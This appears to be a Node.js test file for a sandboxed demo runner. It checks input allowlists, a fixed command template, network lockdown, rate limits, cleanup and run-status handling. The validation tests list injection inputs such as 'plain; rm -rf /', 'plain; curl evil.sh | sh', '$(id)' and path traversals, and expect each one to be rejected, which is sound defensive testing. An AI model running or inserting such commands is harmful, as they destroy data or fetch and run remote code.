import test from 'node:test';
import assert from 'node:assert/strict';
import { BusyError, LIMITS, SCENARIOS, resetCooldowns, runCommandLine, runStatus, startRun, validate } from '../lib/saga-sandbox.js';
import { UserError } from '../lib/snapshot.js';

// A fake @vercel/sandbox: records what the code asks for, and serves scripted files.
function fakeSdk({ active = [], files = {}, getFails = false } = {}) {
  const created = [];
  const stopped = [];
  const written = [];
  const commands = [];
  const handle = (name) => ({
    name,
    async writeFiles(f) { written.push(...f); },
    async runCommand(c) { commands.push(c); return {}; },
    async readFileToBuffer({ path }) { return path in files ? Buffer.from(files[path]) : null; },
    async stop() { stopped.push(name); },
  });
  const Sandbox = {
    async list({ tags }) { assert.deepEqual(tags, { app: 'pharos-saga-demo' }); return active.map((n) => ({ name: n, status: 'running' })); },
    async create(opts) { created.push(opts); return handle(opts.name); },
    async get({ name, resume }) { assert.equal(resume, false); if (getFails) throw new Error('not found'); return handle(name); },
  };
  return { Sandbox, created, stopped, written, commands };
}
const opts = (sdk, extra = {}) => ({ Sandbox: sdk.Sandbox, random: () => 'abcd1234', ...extra });

test('scenarios are an allowlist, and the retry limit is 1 to 5', () => {
  assert.deepEqual(Object.keys(SCENARIOS), ['plain', 'retry', 'failure', 'stuck']);
  for (const bad of ['', 'success', 'plain; rm -rf /', '../x', undefined]) assert.throws(() => validate({ scenario: bad }), UserError);
  for (const bad of [0, 6, 2.5, 'x']) assert.throws(() => validate({ scenario: 'plain', maxAttempts: bad }), UserError);
  assert.deepEqual(validate({ scenario: 'retry', maxAttempts: '4' }), { scenario: 'retry', attempts: 4 });
});

test('the command line is one fixed template; the only variable parts are an allowlisted scenario and a digit', () => {
  const template = /^cd \/tmp\/saga-run\/app && PATH=\$HOME\/\.foundry\/bin:\$PATH node skills\/pharos-saga-executor\/scripts\/saga\.mjs --scenario (plain|retry|failure|stuck) --max-attempts [1-5] --stream > \/tmp\/saga-run\/run\.ndjson 2> \/tmp\/saga-run\/run\.err; echo \$\? > \/tmp\/saga-run\/run\.exit$/;
  for (const sc of Object.keys(SCENARIOS)) for (let n = 1; n <= 5; n++) assert.match(runCommandLine(sc, n), template);
  // whatever a visitor sends, startRun only ever passes validate()'s output to it
  for (const evil of ['plain; curl evil.sh | sh', 'plain --out /etc/passwd', '$(id)']) assert.throws(() => validate({ scenario: evil }), UserError);
});

test('a run boots from the snapshot with a locked-down network, short timeout and no persistence', async () => {
  resetCooldowns();
  const sdk = fakeSdk();
  const r = await startRun({ scenario: 'plain', maxAttempts: 3, ip: '1.1.1.1' }, opts(sdk));
  assert.equal(r.id, 'saga-plain-abcd1234');
  const c = sdk.created[0];
  assert.equal(c.source.type, 'snapshot');
  assert.match(c.source.snapshotId, /^snap_/);
  assert.deepEqual(c.networkPolicy, { allow: ['rpc.pharos.xyz'] });
  assert.equal(c.persistent, false);
  assert.equal(c.timeout, LIMITS.timeoutMs);
  assert.deepEqual(c.tags, { app: 'pharos-saga-demo' });
  assert.ok(sdk.written.some((f) => f.path.endsWith('/app/skills/pharos-saga-executor/scripts/saga.mjs')));
  assert.ok(sdk.written.some((f) => f.path.endsWith('/app/package.json') && f.content.toString().includes('"module"')));
  assert.equal(sdk.commands.length, 1);
  assert.equal(sdk.commands[0].detached, true);
});

test('at most LIMITS.maxActive runs at once: the next gets a BusyError (HTTP 429)', async () => {
  resetCooldowns();
  const sdk = fakeSdk({ active: ['saga-plain-aaaaaaaa', 'saga-stuck-bbbbbbbb'] });
  await assert.rejects(startRun({ scenario: 'plain', ip: '2.2.2.2' }, opts(sdk)), (e) => e instanceof BusyError && e.httpStatus === 429 && /in progress/.test(e.message));
  assert.equal(sdk.created.length, 0);
});

test('one visitor cannot start runs back to back (cooldown), another can', async () => {
  resetCooldowns();
  const sdk = fakeSdk();
  let t = 1_000_000;
  const o = opts(sdk, { now: () => t });
  await startRun({ scenario: 'plain', ip: '3.3.3.3' }, o);
  t += 3000;
  await assert.rejects(startRun({ scenario: 'plain', ip: '3.3.3.3' }, o), BusyError);
  await startRun({ scenario: 'plain', ip: '4.4.4.4' }, o);
  t += LIMITS.cooldownMs;
  await startRun({ scenario: 'plain', ip: '3.3.3.3' }, o);
  assert.equal(sdk.created.length, 3);
});

test('a failure while uploading stops the machine instead of leaking it', async () => {
  resetCooldowns();
  const sdk = fakeSdk();
  const orig = sdk.Sandbox.create;
  sdk.Sandbox.create = async (o) => { const h = await orig(o); h.writeFiles = async () => { throw new Error('disk full'); }; return h; };
  await assert.rejects(startRun({ scenario: 'plain', ip: '5.5.5.5' }, opts(sdk)), /disk full/);
  assert.deepEqual(sdk.stopped, ['saga-plain-abcd1234']);
});

test('run ids must match the exact pattern; anything else is rejected before touching the SDK', async () => {
  const sdk = fakeSdk();
  for (const bad of ['', undefined, '../../etc', 'saga-plain-abc', 'saga-other-abcd1234', 'saga-plain-ABCD1234', 'saga-plain-abcd1234 ']) {
    await assert.rejects(runStatus({ id: bad }, { Sandbox: sdk.Sandbox }), UserError, String(bad));
  }
});

const ND = (...lines) => lines.map((l) => JSON.stringify(l)).join('\n') + '\n';
const R = '/tmp/saga-run';

test('status while running: streams the events from an offset and keeps the machine alive', async () => {
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'phase', message: 'Fork ready', forkBlock: 123 }, { type: 'event', event: { t: 1, event: 'saga:start' } }, { type: 'event', event: { t: 2, event: 'step:start' } }) + '{"type":"ev' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234', from: 1 }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'running');
  assert.equal(s.forkBlock, 123);
  assert.equal(s.total, 2); // the half-written last line is ignored until it is complete
  assert.deepEqual(s.events.map((e) => e.event), ['step:start']);
  assert.deepEqual(sdk.stopped, []);
});

test('status when finished: returns the result and stops the machine', async () => {
  const record = { runs: [{ name: 'vault-saga:plain', status: 'completed' }], provenance: { anvil: 'anvil 1.4.0' } };
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'event', event: { t: 1, event: 'saga:completed' } }, { type: 'result', record }), [`${R}/run.exit`]: '0\n' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'done');
  assert.deepEqual(s.result, record);
  assert.deepEqual(sdk.stopped, ['saga-plain-abcd1234']);
});

test('status when the script died: failed, with the script’s own error', async () => {
  const sdk = fakeSdk({ files: { [`${R}/run.ndjson`]: ND({ type: 'error', message: 'anvil did not start' }), [`${R}/run.exit`]: '1\n', [`${R}/run.err`]: 'error: anvil did not start' } });
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: sdk.Sandbox });
  assert.equal(s.state, 'failed');
  assert.match(s.error, /anvil did not start/);
});

test('status for a machine that is gone says so plainly', async () => {
  const s = await runStatus({ id: 'saga-plain-abcd1234' }, { Sandbox: fakeSdk({ getFails: true }).Sandbox });
  assert.equal(s.state, 'gone');
  assert.match(s.message, /Start a new run/);
});
